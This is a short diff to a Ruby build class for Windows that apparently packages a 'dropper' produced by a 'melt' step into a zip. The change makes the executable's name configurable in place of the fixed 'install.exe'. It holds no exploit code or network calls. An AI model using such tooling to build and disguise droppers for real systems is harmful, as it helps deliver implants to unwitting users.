@@ -53,6 +53,8 @@ class BuildWindows < Build
   def melt(params)
     trace :debug, "Build: melting: #{params}"
 
+    @appname = params['appname'] || 'install'
+
     manifest = (params['admin'] == true) ? '1' : '0'
 
     executable = path('default')
@@ -78,14 +80,14 @@ class BuildWindows < Build
 
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
 
-    @outputs << 'output'
+    @outputs = ['output']
   end
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open('install.exe', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
+      z.file.open(@appname + '.exe', "w") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
